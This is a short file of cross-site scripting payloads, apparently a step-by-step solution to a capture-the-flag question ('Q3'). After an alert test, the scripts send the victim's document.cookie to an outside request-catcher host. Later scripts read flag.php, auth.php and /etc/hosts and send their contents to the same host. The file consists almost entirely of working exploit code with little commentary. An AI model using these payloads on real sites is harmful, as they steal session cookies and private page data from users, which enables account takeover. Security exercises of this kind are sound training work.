//code for Q3

//Step1:
//
<script>alert(document.domain)</script>


//Step2:
//check server
<script>
var x = new XMLHttpRequest();
x.open("POST", "https://question3.free.beeceptor.com");
x.send();
</script>

//Step3:
//get cookie
<script>
var x = new XMLHttpRequest();
x.open("POST", "https://question3.free.beeceptor.com/cookie?"+document.cookie);
x.send();
</script>


//Step4:
//catch flag
<script>
var x = new XMLHttpRequest();
x.onreadystatechange=function()
{
if (x.readyState==4 && x.status==200)
{
   var x2 = new XMLHttpRequest();
   x2.open("GET", "https://question3.free.beeceptor.com?="+x.responseText, true);
   x2.send();
}    
}
x.open("GET", "flag.php", true);
x.send();
</script>



//other test
<script>
var x = new XMLHttpRequest();
x.onreadystatechange=function()
{
if (x.readyState==4 && x.status==200)
{
   var x2 = new XMLHttpRequest();
   x2.open("GET", "https://question3.free.beeceptor.com?="+x.responseText, true);
   x2.send();
}    
}
x.open("GET", "auth.php", true);
x.send();
</script>


<script>
var x = new XMLHttpRequest();
x.onreadystatechange=function()
{
if (x.readyState==4 && x.status==200)
{
   var x2 = new XMLHttpRequest();
   x2.open("GET", "https://question3.free.beeceptor.com?="+x.responseText, true);
   x2.send();
}    
}
x.open("GET", "/etc/hosts", true);
x.send();
</script>
